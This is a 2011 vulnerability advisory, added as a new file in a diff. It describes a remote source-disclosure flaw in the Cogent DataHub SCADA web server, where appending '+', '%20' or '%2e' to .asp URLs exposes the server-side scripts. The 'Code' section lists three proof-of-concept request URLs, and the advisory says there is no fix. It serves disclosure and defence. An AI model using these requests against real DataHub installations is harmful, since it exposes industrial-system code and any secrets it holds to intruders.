@@ -1,0 +1,79 @@
+#######################################################################
+
+                             Luigi Auriemma
+
+Application:  Cogent DataHub
+              http://www.cogentdatahub.com/Products/Cogent_DataHub.html
+Versions:     <= 7.1.1.63
+Platforms:    Windows
+Bug:          source disclosure
+Exploitation: remote
+Date:         13 Sep 2011
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+
+#######################################################################
+
+
+1) Introduction
+2) Bug
+3) The Code
+4) Fix
+
+
+#######################################################################
+
+===============
+1) Introduction
+===============
+
+
+DataHub is a software for the SCADA and automation sector.
+
+
+#######################################################################
+
+======
+2) Bug
+======
+
+
+The server/service listens on port 80 using a custom web server.
+
+Through the appending of the following chars it's possible to view the
+content of the server-side scripts on the server:
+
+  +
+  %20
+  %2e
+
+This vulnerability is useful when the server hosts customized scripts
+which seems a feature of the software:
+http://www.cogentdatahub.com/Features/DataHub_Web_ASP.html
+
+
+#######################################################################
+
+===========
+3) The Code
+===========
+
+
+http://SERVER/index.asp+
+http://SERVER/index.asp%20
+http://SERVER/index.asp%2e
+
+
+#######################################################################
+
+======
+4) Fix
+======
+
+
+No fix.
+
+
+#######################################################################
